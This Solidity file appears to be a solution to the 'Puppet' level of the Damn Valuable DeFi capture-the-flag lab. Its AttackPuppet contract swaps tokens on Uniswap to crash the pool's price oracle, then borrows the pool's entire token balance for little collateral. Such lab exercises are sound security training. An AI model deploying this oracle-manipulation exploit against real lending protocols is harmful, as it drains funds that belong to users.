// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "./IUniswapExchange.sol";
import "../DamnValuableToken.sol";

contract AttackPuppet {
    address payable public immutable attacker;
    IUniswapExchange public immutable uniswap;
    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;

    constructor(
        PuppetPool _pool,
        DamnValuableToken _token,
        IUniswapExchange _uniswap
    ) payable {
        attacker = payable(msg.sender);
        pool = _pool;
        uniswap = _uniswap;
        token = _token;
    }

    function attack() external payable {
        // approve tokens within uniswap. We want to swap all our tokens to make the borrow cheaper.
        token.approve(address(uniswap), 1000 ether);
        uniswap.tokenToEthSwapInput(1000 ether, 1, block.timestamp + 5000);

        // Borrow all 100k tokens giving all our eth (15 + 5 from the swap)
        pool.borrow{value: 20 ether}(100000 ether, attacker);
    }

    receive() external payable {}
}
